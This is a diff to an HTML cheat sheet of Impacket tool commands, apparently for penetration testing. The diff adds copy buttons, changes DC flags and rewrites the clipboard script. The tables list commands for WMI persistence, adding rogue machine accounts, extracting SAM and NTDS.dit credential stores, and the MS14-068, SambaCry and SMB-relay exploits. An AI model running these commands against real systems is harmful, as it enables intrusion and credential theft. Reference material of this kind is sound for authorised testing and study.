 <h2>MSRPC / Registry / Services</h2>
 <table>
-  <tr><td class="tool">python3 services.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 list</td><td class="desc">List all Windows services</td></tr>
-  <tr><td class="tool">python3 services.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 start -name Spooler</td><td class="desc">start / stop / status / delete service</td></tr>
-  <tr><td class="tool">python3 reg.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 query -keyName "HKLM\SOFTWARE\..." -v ProductName</td><td class="desc">Remote registry read/write/delete</td></tr>
-  <tr><td class="tool">python3 rpcdump.py</td><td class="cmd">192.168.1.10</td><td class="desc">Dump all RPC endpoints</td></tr>
-  <tr><td class="tool">python3 rpcmap.py</td><td class="cmd">ncacn_ip_tcp:192.168.1.10</td><td class="desc">Scan for listening DCE/RPC interfaces</td></tr>
-  <tr><td class="tool">python3 ifmap.py</td><td class="cmd">192.168.1.10 135</td><td class="desc">Enumerate DCERPC interfaces via MGMT</td></tr>
-  <tr><td class="tool">python3 opdump.py</td><td class="cmd">192.168.1.10 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0</td><td class="desc">Dump ops for a specific RPC interface</td></tr>
-  <tr><td class="tool">python3 wmiquery.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -query "SELECT * FROM Win32_Process"</td><td class="desc">Run WQL query via WMI</td></tr>
-  <tr><td class="tool">python3 wmipersist.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 install -name evil -filter "SELECT * FROM __InstanceModificationEvent" -vbscript script.vbs</td><td class="desc">WMI event subscription persistence</td></tr>
-  <tr><td class="tool">python3 tstool.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -cmd list</td><td class="desc">Terminal Services / RDP session mgmt</td></tr>
+  <tr><td class="tool">python3 services.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 list</td><td class="desc">List all Windows services</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 services.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 start -name Spooler</td><td class="desc">start / stop / status / delete service</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 reg.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 query -keyName "HKLM\SOFTWARE\..." -v ProductName</td><td class="desc">Remote registry read/write/delete</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 rpcdump.py</td><td class="cmd">192.168.1.10</td><td class="desc">Dump all RPC endpoints</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 rpcmap.py</td><td class="cmd">ncacn_ip_tcp:192.168.1.10</td><td class="desc">Scan for listening DCE/RPC interfaces</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 ifmap.py</td><td class="cmd">192.168.1.10 135</td><td class="desc">Enumerate DCERPC interfaces via MGMT</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 opdump.py</td><td class="cmd">192.168.1.10 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0</td><td class="desc">Dump ops for a specific RPC interface</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 wmiquery.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -query "SELECT * FROM Win32_Process"</td><td class="desc">Run WQL query via WMI</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 wmipersist.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 install -name evil -filter "SELECT * FROM __InstanceModificationEvent" -vbscript script.vbs</td><td class="desc">WMI event subscription persistence</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 tstool.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -cmd list</td><td class="desc">Terminal Services / RDP session mgmt</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>AD Computer / Password</h2>
 <table>
-  <tr><td class="tool">python3 addcomputer.py</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1 -computer-name EVIL$ -computer-pass P@ss1</td><td class="desc">Add machine account to domain</td></tr>
-  <tr><td class="tool">python3 changepasswd.py</td><td class="cmd">DOMAIN/user:OldPass@192.168.1.10 -newpass NewPass1!</td><td class="desc">Change/reset password (multi-protocol)</td></tr>
-  <tr><td class="tool">python3 net.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 user -list</td><td class="desc">Remote net.exe equivalent</td></tr>
-  <tr><td class="tool">python3 getArch.py</td><td class="cmd">-target 192.168.1.10</td><td class="desc">Detect remote OS architecture</td></tr>
-  <tr><td class="tool">python3 badsuccessor.py</td><td class="cmd">DOMAIN/user:Pass -dc-ip 192.168.1.1 -target victimOU</td><td class="desc">AD CS "bad successor" attack path</td></tr>
+  <tr><td class="tool">python3 addcomputer.py</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1 -computer-name EVIL$ -computer-pass P@ss1</td><td class="desc">Add machine account to domain</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 changepasswd.py</td><td class="cmd">DOMAIN/user:OldPass@192.168.1.10 -newpass NewPass1!</td><td class="desc">Change/reset password (multi-protocol)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 net.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 user -list</td><td class="desc">Remote net.exe equivalent</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 getArch.py</td><td class="cmd">-target 192.168.1.10</td><td class="desc">Detect remote OS architecture</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 badsuccessor.py</td><td class="cmd">DOMAIN/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1 -target victimOU</td><td class="desc">AD CS "bad successor" attack path</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Exchange</h2>
 <table>
-  <tr><td class="tool">python3 exchanger.py</td><td class="cmd">domain.local/user:Pass@mail.domain.local nspi dump-tables -name GAL</td><td class="desc">Dump Exchange address book via RPC</td></tr>
+  <tr><td class="tool">python3 exchanger.py</td><td class="cmd">domain.local/user:Pass@mail.domain.local nspi dump-tables -name GAL</td><td class="desc">Dump Exchange address book via RPC</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Exploits</h2>
 <table>
-  <tr><td class="tool">python3 goldenPac.py</td><td class="cmd">domain.local/user:Pass@dc01.domain.local</td><td class="desc">MS14-068 Kerberos privesc</td></tr>
-  <tr><td class="tool">python3 sambaPipe.py</td><td class="cmd">-dc-ip 192.168.1.1 domain.local/user:Pass -so /path/to/payload.so</td><td class="desc">CVE-2017-7494 (SambaCry)</td></tr>
-  <tr><td class="tool">python3 smbrelayx.py</td><td class="cmd">-h victimIP -c "whoami"</td><td class="desc">CVE-2015-0005 SMB relay</td></tr>
+  <tr><td class="tool">python3 goldenPac.py</td><td class="cmd">domain.local/user:Pass@dc01.domain.local</td><td class="desc">MS14-068 Kerberos privesc</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 sambaPipe.py</td><td class="cmd">-dc-host 192.168.1.1 -ns 192.168.1.1 domain.local/user:Pass -so /path/to/payload.so</td><td class="desc">CVE-2017-7494 (SambaCry)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 smbrelayx.py</td><td class="cmd">-h victimIP -c "whoami"</td><td class="desc">CVE-2015-0005 SMB relay</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Offline / File Format Tools</h2>
 <table>
-  <tr><td class="tool">python3 esentutl.py</td><td class="cmd">ntds.dit dump -table datatable</td><td class="desc">Parse ESE/JET database (NTDS.dit)</td></tr>
-  <tr><td class="tool">python3 ntfs-read.py</td><td class="cmd">"\C:" -extract "\windows\system32\config\sam"</td><td class="desc">Browse/extract from NTFS volume</td></tr>
-  <tr><td class="tool">python3 registry-read.py</td><td class="cmd">SYSTEM walk</td><td class="desc">Parse offline registry hive</td></tr>
+  <tr><td class="tool">python3 esentutl.py</td><td class="cmd">ntds.dit dump -table datatable</td><td class="desc">Parse ESE/JET database (NTDS.dit)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 ntfs-read.py</td><td class="cmd">"\C:" -extract "\windows\system32\config\sam"</td><td class="desc">Browse/extract from NTFS volume</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 registry-read.py</td><td class="cmd">SYSTEM walk</td><td class="desc">Parse offline registry hive</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Misc / Network</h2>
 <table>
-  <tr><td class="tool">python3 rdp_check.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Validate creds via RDP/CredSSP</td></tr>
-  <tr><td class="tool">python3 mqtt_check.py</td><td class="cmd">domain/user:Pass@192.168.1.10</td><td class="desc">MQTT login check</td></tr>
-  <tr><td class="tool">python3 ping.py</td><td class="cmd">192.168.1.10</td><td class="desc">IPv4 ICMP ping</td></tr>
-  <tr><td class="tool">python3 ping6.py</td><td class="cmd">fe80::1</td><td class="desc">IPv6 ICMP ping</td></tr>
-  <tr><td class="tool">python3 sniff.py</td><td class="cmd">-i eth0</td><td class="desc">Simple packet sniffer</td></tr>
-  <tr><td class="tool">python3 sniffer.py</td><td class="cmd">-i eth0</td><td class="desc">Alternative packet sniffer</td></tr>
-  <tr><td class="tool">python3 split.py</td><td class="cmd">-f capture.pcap -o /output/dir</td><td class="desc">Split pcap by stream</td></tr>
-  <tr><td class="tool">python3 nmapAnswerMachine.py</td><td class="cmd">-i eth0</td><td class="desc">Answer nmap probes to spoof open ports</td></tr>
+  <tr><td class="tool">python3 rdp_check.py</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Validate creds via RDP/CredSSP</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 mqtt_check.py</td><td class="cmd">domain/user:Pass@192.168.1.10</td><td class="desc">MQTT login check</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 ping.py</td><td class="cmd">192.168.1.10</td><td class="desc">IPv4 ICMP ping</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 ping6.py</td><td class="cmd">fe80::1</td><td class="desc">IPv6 ICMP ping</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 sniff.py</td><td class="cmd">-i eth0</td><td class="desc">Simple packet sniffer</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 sniffer.py</td><td class="cmd">-i eth0</td><td class="desc">Alternative packet sniffer</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 split.py</td><td class="cmd">-f capture.pcap -o /output/dir</td><td class="desc">Split pcap by stream</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">python3 nmapAnswerMachine.py</td><td class="cmd">-i eth0</td><td class="desc">Answer nmap probes to spoof open ports</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 </div><!-- /python -->
 
 <script>
-  function setTab(tab) {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    document.querySelectorAll('.toggle-btn').forEach(b => b.classList.remove('active'));
+  function setTab(tab, btn) {
+    document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+    document.querySelectorAll('.toggle-btn').forEach(function(b) { b.classList.remove('active'); });
     document.getElementById('tab-' + tab).classList.add('active');
-    event.target.classList.add('active');
+    btn.classList.add('active');
   }
 
-  const toast    = document.getElementById('toast');
-  const toastCmd = document.getElementById('toast-cmd');
-  let toastTimer = null;
+  var toastEl  = document.getElementById('toast');
+  var toastCmd = document.getElementById('toast-cmd');
+  var toastTimer = null;
 
-  document.addEventListener('click', function(e) {
-    const row = e.target.closest('tr');
-    if (!row) return;
-    const tool = row.querySelector('.tool');
-    const cmd  = row.querySelector('.cmd');
+  function showToast(text) {
+    toastCmd.textContent = text.length > 60 ? text.slice(0, 58) + '...' : text;
+    toastEl.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function() { toastEl.classList.remove('show'); }, 1400);
+  }
+
+  function copyRow(btn) {
+    var row  = btn.closest('tr');
+    var tool = row.querySelector('.tool');
+    var cmd  = row.querySelector('.cmd');
     if (!tool || !cmd) return;
+    var text = tool.innerText.trim() + ' ' + cmd.innerText.trim();
+    row.classList.add('copied');
+    setTimeout(function() { row.classList.remove('copied'); }, 700);
+    showToast(text);
+    // Try modern clipboard API first, fall back to execCommand for file://
+    if (navigator.clipboard && window.isSecureContext) {
+      navigator.clipboard.writeText(text).catch(function() { fallbackCopy(text); });
+    } else {
+      fallbackCopy(text);
+    }
+  }
 
-    const text = tool.innerText.trim() + ' ' + cmd.innerText.trim();
-
-    navigator.clipboard.writeText(text).then(() => {
-      // Update toast content
-      toastCmd.textContent = text.length > 60 ? text.slice(0, 58) + '…' : text;
-
-      // Row flash
-      row.classList.add('copied');
-      setTimeout(() => row.classList.remove('copied'), 700);
-
-      // Show toast
-      toast.classList.add('show');
-      clearTimeout(toastTimer);
-      toastTimer = setTimeout(() => toast.classList.remove('show'), 1400);
-    });
-  });
+  function fallbackCopy(text) {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.left = '-9999px';
+    ta.style.top  = '-9999px';
+    document.body.appendChild(ta);
+    ta.focus();
+    ta.select();
+    try { document.execCommand('copy'); } catch(e) {}
+    document.body.removeChild(ta);
+  }
 </script>
+
 </body>
 </html>
